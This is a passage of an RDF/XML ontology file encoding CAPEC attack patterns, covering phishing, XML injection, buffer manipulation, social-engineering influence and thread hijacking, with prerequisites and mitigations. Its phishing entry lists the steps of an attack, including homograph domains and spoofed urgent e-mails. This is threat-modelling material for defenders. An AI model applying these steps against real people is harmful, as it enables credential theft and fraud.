          <j.0:ExecutionFlow rdf:about="http://krstProj.com/capec#::STEP:1:PHASE:Explore:DESCRIPTION:(Obtain domain name and certificate to spoof legitimate site) This optional step can be used to help the attacker impersonate the legitimate site more convincingly. The attacker can use homograph attacks to convince users that they are using the legitimate website. Note that this step is not required for phishing attacks  and many phishing attacks simply supply URLs containing an IP address and no SSL certificate.TECHNIQUE:Optionally obtain a domain name that visually looks similar to the legitimate site&apos;s domain name. An example is www.paypaI.com vs. www.paypal.com (the first one contains a capital i  instead of a lower case L):TECHNIQUE:Optionally obtain a legitimate SSL certificate for the new domain name.::STEP:2:PHASE:Explore:DESCRIPTION:(Explore legitimate website and create duplicate) An attacker creates a website (optionally at a URL that looks similar to the original URL) that closely resembles the website that he or she is trying to impersonate. That website will typically have a login form for the victim to put in their authentication credentials. There can be different variations on a theme here.TECHNIQUE:Use spidering software to get copy of web pages on legitimate site.:TECHNIQUE:Manually save copies of required web pages from legitimate site.:TECHNIQUE:Create new web pages that have the legitimate site&apos;s look at feel  but contain completely new content.::STEP:3:PHASE:Exploit:DESCRIPTION:(Convince user to enter sensitive information on attacker&apos;s site.) An attacker sends an e-mail to the victim that has some sort of a call to action to get the user to click on the link included in the e-mail (which takes the victim to attacker&apos;s website) and log in. The key is to get the victim to believe that the e-mail is coming from a legitimate entity with which the victim does business and that the website pointed to by the URL in the e-mail is the legitimate website. A call to action will usually need to sound legitimate and urgent enough to prompt action from the user.TECHNIQUE:Send the user a message from a spoofed legitimate-looking e-mail address that asks the user to click on the included link.:TECHNIQUE:Place phishing link in post to online forum.::STEP:4:PHASE:Exploit:DESCRIPTION:(Use stolen credentials to log into legitimate site) Once the attacker captures some sensitive information through phishing (login credentials  credit card information  etc.) the attacker can leverage this information. For instance  the attacker can use the victim&apos;s login credentials to log into their bank account and transfer money to an account of their choice.TECHNIQUE:Log in to the legitimate site using another user&apos;s supplied credentials::"/>
        </j.0:executes>
        <j.0:implies>
          <j.0:Consequence rdf:about="http://krstProj.com/capec#::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Gain Privileges::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data::SCOPE:IntegrityTECHNICAL IMPACT:Modify Data::"/>
        </j.0:implies>
      </j.0:Attack>
    </j.0:makes>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::An attacker needs to have a way to initiate contact with the victim. Typically that will happen through e-mail.::An attacker needs to correctly guess the entity with which the victim does business and impersonate it. Most of the time phishers just use the most popular banks/services and send out their hooks to many potential victims.::An attacker needs to have a sufficiently compelling call to action to prompt the user to take action.::The replicated website needs to look extremely similar to the original website and the URL used to get to that website needs to look like the real URL of the said business entity.::"/>
    </j.0:precondition>
    <j.0:need>
      <j.0:Skill rdf:about="http://krstProj.com/capec#::SKILL:Basic knowledge about websites: obtaining them  designing and implementing them  etc.:LEVEL:Medium::"/>
    </j.0:need>
    <j.0:uses>
      <j.0:Resource rdf:about="http://krstProj.com/capec#::Some web development tools to put up a fake website.::"/>
    </j.0:uses>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker107">
    <j.0:relatedTo>
      <j.0:Id rdf:about="http://krstProj.com/capec#648">
        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:150::"/>
        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#Medium"/>
        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Medium"/>
        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
        <j.0:hasName>
          <j.0:Name rdf:about="http://krstProj.com/capec#Collect Data from Screen Capture"/>
        </j.0:hasName>
      </j.0:Id>
    </j.0:relatedTo>
    <j.0:makes>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack107">
        <j.0:relatedTo rdf:resource="http://krstProj.com/capec#648"/>
        <j.0:exploits>
          <j.0:Vulnerability rdf:about="http://krstProj.com/capec#::267::"/>
        </j.0:exploits>
        <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:implies>
          <j.0:Consequence rdf:about="http://krstProj.com/capec#::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data:NOTE:Confidentiality Read Data The adversary is able to capture potentially sensitive information and processes as they appear on the screen.::"/>
        </j.0:implies>
      </j.0:Attack>
    </j.0:makes>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::267::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::The adversary must have obtained logical access to the system by some means (e.g.  via obtained credentials or planting malware on the system).::"/>
    </j.0:precondition>
    <j.0:need>
      <j.0:Skill rdf:about="http://krstProj.com/capec#::SKILL:Once the adversary has logical access (which can potentially require high knowledge and skill level)  the adversary needs only to leverage the relevant command for screen capture.:LEVEL:Low::"/>
    </j.0:need>
    <j.0:uses rdf:resource="http://krstProj.com/capec#::None: No specialized resources are required to execute this type of attack.::"/>
  </j.0:Attacker>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Strong input validation - All user-controllable input must be validated and filtered for illegal characters as well as content that can be interpreted in the context of an XML data or a query. Use of custom error pages - Attackers can glean information about the nature of queries from descriptive error messages. Input validation must be coupled with customized error pages that inform about an error without disclosing information about the database or application.::">
    <j.0:reduces>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack349">
        <j.0:relatedTo>
          <j.0:Id rdf:about="http://krstProj.com/capec#250">
            <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:248::"/>
            <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#High"/>
            <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#null"/>
            <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
            <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Standard"/>
            <j.0:hasName>
              <j.0:Name rdf:about="http://krstProj.com/capec#XML Injection"/>
            </j.0:hasName>
          </j.0:Id>
        </j.0:relatedTo>
        <j.0:exploits rdf:resource="http://krstProj.com/capec#::91::74::20::713::707::"/>
        <j.0:executes>
          <j.0:ExecutionFlow rdf:about="http://krstProj.com/capec#::STEP:1:PHASE:Explore:DESCRIPTION:(Survey Application)TECHNIQUE:Spider web sites for all available links.:TECHNIQUE:Gather results for analysis via responses or network sniffing.::STEP:2:PHASE:Experiment:DESCRIPTION:(Test user-controllable inputs for injection)TECHNIQUE:Use XML reserved characters or words  possibly with other input data to attempt to cause unexpected results::"/>
        </j.0:executes>
        <j.0:implies rdf:resource="http://krstProj.com/capec#::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Gain Privileges::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data::"/>
      </j.0:Attack>
    </j.0:reduces>
  </j.0:MitigationAction>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker410">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#564"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack410"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::284::"/>
    <j.0:precondition rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Design: Range  size and value and consistency verification for any arguments supplied to applications and services from external sources and devise appropriate error response.::Design: Ensure that function calls that should not be called by an unprivileged user are not accessible to them.::">
    <j.0:reduces>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack130">
        <j.0:relatedTo>
          <j.0:Id rdf:about="http://krstProj.com/capec#278">
            <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:272::"/>
            <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#null"/>
            <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#null"/>
            <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
            <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Standard"/>
            <j.0:hasName>
              <j.0:Name rdf:about="http://krstProj.com/capec#Web Services Protocol Manipulation"/>
            </j.0:hasName>
          </j.0:Id>
        </j.0:relatedTo>
        <j.0:exploits rdf:resource="http://krstProj.com/capec#::707::"/>
        <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:implies rdf:resource="http://krstProj.com/capec#null"/>
      </j.0:Attack>
    </j.0:reduces>
  </j.0:MitigationAction>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker239">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#167"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack239"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::Direct access to the object or software.::"/>
    </j.0:precondition>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses>
      <j.0:Resource rdf:about="http://krstProj.com/capec#::Reverse engineering of software requires varying tools and methods that enable the decompiling of executable or other compiled objects.::"/>
    </j.0:uses>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker106">
    <j.0:relatedTo>
      <j.0:Id rdf:about="http://krstProj.com/capec#507">
        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Meta"/>
        <j.0:hasName>
          <j.0:Name rdf:about="http://krstProj.com/capec#Physical Theft"/>
        </j.0:hasName>
      </j.0:Id>
    </j.0:relatedTo>
    <j.0:makes>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack106">
        <j.0:relatedTo rdf:resource="http://krstProj.com/capec#507"/>
        <j.0:exploits rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:implies rdf:resource="http://krstProj.com/capec#null"/>
      </j.0:Attack>
    </j.0:makes>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::This type of attack requires the existence of a physical target that an adversary believes hosts something of value.::"/>
    </j.0:precondition>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::To help protect an application from buffer manipulation attacks  a number of potential mitigations can be leveraged. Before starting the development of the application  consider using a code language (e.g.  Java) or compiler that limits the ability of developers to act beyond the bounds of a buffer. If the chosen language is susceptible to buffer related issues (e.g.  C) then consider using secure functions instead of those vulnerable to buffer manipulations. If a potentially dangerous function must be used  make sure that proper boundary checking is performed. Additionally  there are often a number of compiler-based mechanisms (e.g.  StackGuard  ProPolice and the Microsoft Visual Studio /GS flag) that can help identify and protect against potential buffer issues. Finally  there may be operating system level preventative functionality that can be applied.::">
    <j.0:reduces>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack131">
        <j.0:relatedTo>
          <j.0:Id rdf:about="http://krstProj.com/capec#123">
            <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#null"/>
            <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#High"/>
            <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Very High"/>
            <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
            <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Meta"/>
            <j.0:hasName>
              <j.0:Name rdf:about="http://krstProj.com/capec#Buffer Manipulation"/>
            </j.0:hasName>
          </j.0:Id>
        </j.0:relatedTo>
        <j.0:exploits>
          <j.0:Vulnerability rdf:about="http://krstProj.com/capec#::119::"/>
        </j.0:exploits>
        <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:implies>
          <j.0:Consequence rdf:about="http://krstProj.com/capec#::SCOPE:AvailabilityTECHNICAL IMPACT:Unreliable Execution:NOTE:Availability Unreliable Execution A buffer manipulation attack often results in a crash of the application due to the corruption of memory.::SCOPE:ConfidentialityTECHNICAL IMPACT:Execute Unauthorized Commands:TECHNICAL IMPACT:Modify Data:TECHNICAL IMPACT:Read Data:NOTE:Confidentiality Execute Unauthorized Commands Modify Data Read Data If constructed properly  a buffer manipulation attack can be used to contol the execution of the application leading to any number of negative consequenses.::"/>
        </j.0:implies>
      </j.0:Attack>
    </j.0:reduces>
  </j.0:MitigationAction>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::An organization should provide regular  robust cybersecurity training to its employees to prevent social engineering attacks. Individuals should avoid complying with suspicious requests.::">
    <j.0:reduces>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack198">
        <j.0:relatedTo>
          <j.0:Id rdf:about="http://krstProj.com/capec#422">
            <j.0:relatedPattern>
              <j.0:AttackPattern rdf:about="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:417::"/>
            </j.0:relatedPattern>
            <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#High"/>
            <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Low"/>
            <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Stable"/>
            <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
            <j.0:hasName>
              <j.0:Name rdf:about="http://krstProj.com/capec#Influence Perception of Commitment and Consistency"/>
            </j.0:hasName>
          </j.0:Id>
        </j.0:relatedTo>
        <j.0:exploits rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:implies>
          <j.0:Consequence rdf:about="http://krstProj.com/capec#::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:AvailabilityTECHNICAL IMPACT:Other:NOTE:Confidentiality Integrity Availability Other Attacks that leverage the principle of scarcity can lead to the target performing an action that results in a variety of consequences that negatively affect the confidentiality  availability  and/or integrity of an application or system.::"/>
        </j.0:implies>
      </j.0:Attack>
    </j.0:reduces>
  </j.0:MitigationAction>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::An organization should provide regular  robust cybersecurity training to its employees to prevent social engineering attacks.::">
    <j.0:reduces>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack435">
        <j.0:relatedTo>
          <j.0:Id rdf:about="http://krstProj.com/capec#417">
            <j.0:relatedPattern>
              <j.0:AttackPattern rdf:about="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:416::"/>
            </j.0:relatedPattern>
            <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#High"/>
            <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Low"/>
            <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Stable"/>
            <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Standard"/>
            <j.0:hasName>
              <j.0:Name rdf:about="http://krstProj.com/capec#Influence Perception"/>
            </j.0:hasName>
          </j.0:Id>
        </j.0:relatedTo>
        <j.0:exploits rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:implies>
          <j.0:Consequence rdf:about="http://krstProj.com/capec#::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:AvailabilityTECHNICAL IMPACT:Other:NOTE:Confidentiality Integrity Availability Other Attacks that influence the perception of the target can result in a wide variety of consequences and negatively affect potentially the confidentiality  availability  and/or integrity of an application or system.::"/>
        </j.0:implies>
      </j.0:Attack>
    </j.0:reduces>
    <j.0:reduces>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack429">
        <j.0:relatedTo>
          <j.0:Id rdf:about="http://krstProj.com/capec#427">
            <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:416::"/>
            <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#Low"/>
            <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Low"/>
            <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
            <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Standard"/>
            <j.0:hasName>
              <j.0:Name rdf:about="http://krstProj.com/capec#Influence via Psychological Principles"/>
            </j.0:hasName>
          </j.0:Id>
        </j.0:relatedTo>
        <j.0:exploits rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:implies>
          <j.0:Consequence rdf:about="http://krstProj.com/capec#::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:AvailabilityTECHNICAL IMPACT:Other:NOTE:Confidentiality Integrity Availability Other Attacks that successfully influence the target into performing an action via psychological principles can result in a variety of consequences that negatively affect the confidentiality  availability  and/or integrity of an application or system.::"/>
        </j.0:implies>
      </j.0:Attack>
    </j.0:reduces>
    <j.0:reduces>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack427">
        <j.0:relatedTo>
          <j.0:Id rdf:about="http://krstProj.com/capec#420">
            <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:417::"/>
            <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#High"/>
            <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Low"/>
            <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Stable"/>
            <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
            <j.0:hasName>
              <j.0:Name rdf:about="http://krstProj.com/capec#Influence Perception of Scarcity"/>
            </j.0:hasName>
          </j.0:Id>
        </j.0:relatedTo>
        <j.0:exploits rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:implies rdf:resource="http://krstProj.com/capec#::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:AvailabilityTECHNICAL IMPACT:Other:NOTE:Confidentiality Integrity Availability Other Attacks that leverage the principle of scarcity can lead to the target performing an action that results in a variety of consequences that negatively affect the confidentiality  availability  and/or integrity of an application or system.::"/>
      </j.0:Attack>
    </j.0:reduces>
    <j.0:reduces>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack426">
        <j.0:relatedTo>
          <j.0:Id rdf:about="http://krstProj.com/capec#424">
            <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:417::"/>
            <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#Low"/>
            <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Low"/>
            <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
            <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
            <j.0:hasName>
              <j.0:Name rdf:about="http://krstProj.com/capec#Influence Perception of Consensus or Social Proof"/>
            </j.0:hasName>
          </j.0:Id>
        </j.0:relatedTo>
        <j.0:exploits rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:implies>
          <j.0:Consequence rdf:about="http://krstProj.com/capec#::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:AvailabilityTECHNICAL IMPACT:Other:NOTE:Confidentiality Integrity Availability Other Attacks that leverage the principle of liking can lead to the target performing an action that results in a variety of consequences that negatively affect the confidentiality  availability  and/or integrity of an application or system.::"/>
        </j.0:implies>
      </j.0:Attack>
    </j.0:reduces>
    <j.0:reduces>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack425">
        <j.0:relatedTo>
          <j.0:Id rdf:about="http://krstProj.com/capec#423">
            <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:417::"/>
            <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#Medium"/>
            <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Low"/>
            <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Stable"/>
            <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
            <j.0:hasName>
              <j.0:Name rdf:about="http://krstProj.com/capec#Influence Perception of Liking"/>
            </j.0:hasName>
          </j.0:Id>
        </j.0:relatedTo>
        <j.0:exploits rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:implies rdf:resource="http://krstProj.com/capec#::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:AvailabilityTECHNICAL IMPACT:Other:NOTE:Confidentiality Integrity Availability Other Attacks that leverage the principle of liking can lead to the target performing an action that results in a variety of consequences that negatively affect the confidentiality  availability  and/or integrity of an application or system.::"/>
      </j.0:Attack>
    </j.0:reduces>
    <j.0:reduces>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack424">
        <j.0:relatedTo>
          <j.0:Id rdf:about="http://krstProj.com/capec#426">
            <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:416::"/>
            <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#Low"/>
            <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Low"/>
            <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Stable"/>
            <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Standard"/>
            <j.0:hasName>
              <j.0:Name rdf:about="http://krstProj.com/capec#Influence via Incentives"/>
            </j.0:hasName>
          </j.0:Id>
        </j.0:relatedTo>
        <j.0:exploits rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:implies>
          <j.0:Consequence rdf:about="http://krstProj.com/capec#::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:AvailabilityTECHNICAL IMPACT:Other:NOTE:Confidentiality Integrity Availability Other Attacks that successfully incentivize the target into performing an action beneficial to the adversary can result in a variety of consequences that negatively affect the confidentiality  availability  and/or integrity of an application or system.::"/>
        </j.0:implies>
      </j.0:Attack>
    </j.0:reduces>
    <j.0:reduces>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack185">
        <j.0:relatedTo>
          <j.0:Id rdf:about="http://krstProj.com/capec#418">
            <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:417::"/>
            <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#Medium"/>
            <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Medium"/>
            <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
            <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
            <j.0:hasName>
              <j.0:Name rdf:about="http://krstProj.com/capec#Influence Perception of Reciprocation"/>
            </j.0:hasName>
          </j.0:Id>
        </j.0:relatedTo>
        <j.0:exploits rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:implies rdf:resource="http://krstProj.com/capec#::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:AvailabilityTECHNICAL IMPACT:Other:NOTE:Confidentiality Integrity Availability Other Attacks that influence the perception of the target can result in a wide variety of consequences and negatively affect potentially the confidentiality  availability  and/or integrity of an application or system.::"/>
      </j.0:Attack>
    </j.0:reduces>
    <j.0:reduces>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack184">
        <j.0:relatedTo>
          <j.0:Id rdf:about="http://krstProj.com/capec#421">
            <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:417::"/>
            <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#High"/>
            <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Low"/>
            <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Stable"/>
            <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
            <j.0:hasName>
              <j.0:Name rdf:about="http://krstProj.com/capec#Influence Perception of Authority"/>
            </j.0:hasName>
          </j.0:Id>
        </j.0:relatedTo>
        <j.0:exploits rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:implies rdf:resource="http://krstProj.com/capec#::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:AvailabilityTECHNICAL IMPACT:Other:NOTE:Confidentiality Integrity Availability Other Attacks that leverage the principle of scarcity can lead to the target performing an action that results in a variety of consequences that negatively affect the confidentiality  availability  and/or integrity of an application or system.::"/>
      </j.0:Attack>
    </j.0:reduces>
  </j.0:MitigationAction>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker363">
    <j.0:relatedTo>
      <j.0:Id rdf:about="http://krstProj.com/capec#236">
        <j.0:relatedPattern>
          <j.0:AttackPattern rdf:about="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:30::"/>
        </j.0:relatedPattern>
        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#Low"/>
        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Very High"/>
        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
        <j.0:hasName>
          <j.0:Name rdf:about="http://krstProj.com/capec#Catching exception throw/signal from privileged block"/>
        </j.0:hasName>
      </j.0:Id>
    </j.0:relatedTo>
    <j.0:makes>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack363">
        <j.0:relatedTo rdf:resource="http://krstProj.com/capec#236"/>
        <j.0:exploits rdf:resource="http://krstProj.com/capec#::270::"/>
        <j.0:executes>
          <j.0:ExecutionFlow rdf:about="http://krstProj.com/capec#::STEP:1:PHASE:Explore:DESCRIPTION:Attacker determines the underlying system thread that is subject to user-control::STEP:2:PHASE:Experiment:DESCRIPTION:Attacker then provides input  perhaps by way of environment variables for the process in question  that affect the executing thread::STEP:3:PHASE:Exploit:DESCRIPTION:Upon successful hijacking  the attacker enjoys elevated privileges  and can possibly have the hijacked thread do his bidding::"/>
        </j.0:executes>
        <j.0:implies rdf:resource="http://krstProj.com/capec#::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Gain Privileges::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:AvailabilityTECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Confidentiality Integrity Availability Execute Unauthorized Commands Run Arbitrary Code::"/>
      </j.0:Attack>
    </j.0:makes>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::270::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::The application in question employs a threaded model of execution with the threads operating at  or having the ability to switch to  a higher privilege level than normal users::In order to feasibly execute this class of attacks  the attacker must have the ability to hijack a privileged thread.::This ability includes  but is not limited to  modifying environment variables that affect the process the thread belongs to  or providing malformed user-controllable input that causes the executing thread to fault and return to a higher privilege level or such.::This does not preclude network-based attacks  but makes them conceptually more difficult to identify and execute.::"/>
    </j.0:precondition>
    <j.0:need rdf:resource="http://krstProj.com/capec#::SKILL:Hijacking a thread involves knowledge of how processes and threads function on the target platform  the design of the target application as well as the ability to identify the primitives to be used or manipulated to hijack the thread.:LEVEL:High::"/>
    <j.0:uses>
      <j.0:Resource rdf:about="http://krstProj.com/capec#::None: No specialized resources are required to execute this type of attack. The attacker needs to be able to latch onto a privileged thread. The Attacker does  however  need to be able to program  compile  and link to the victim binaries being executed so that it will turn control of a privileged thread over to the Attacker&apos;s malicious code. This is the case even if the attacker conducts the attack remotely.::"/>
    </j.0:uses>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker496">
    <j.0:relatedTo>
      <j.0:Id rdf:about="http://krstProj.com/capec#5">
        <j.0:relatedPattern>
          <j.0:AttackPattern rdf:about="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:220::"/>
        </j.0:relatedPattern>
        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#Medium"/>
        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Very High"/>
        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
        <j.0:hasName>
          <j.0:Name rdf:about="http://krstProj.com/capec#Blue Boxing"/>
        </j.0:hasName>
      </j.0:Id>
    </j.0:relatedTo>
    <j.0:makes>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack496">
        <j.0:relatedTo rdf:resource="http://krstProj.com/capec#5"/>
        <j.0:exploits rdf:resource="http://krstProj.com/capec#::285::"/>
        <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:implies>
          <j.0:Consequence rdf:about="http://krstProj.com/capec#::SCOPE:AvailabilityTECHNICAL IMPACT:Resource Consumption:NOTE:Availability Resource Consumption Denial of Service::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Gain Privileges::"/>
        </j.0:implies>
      </j.0:Attack>
    </j.0:makes>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::285::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::System must use weak authentication mechanisms for administrative functions.::"/>
    </j.0:precondition>
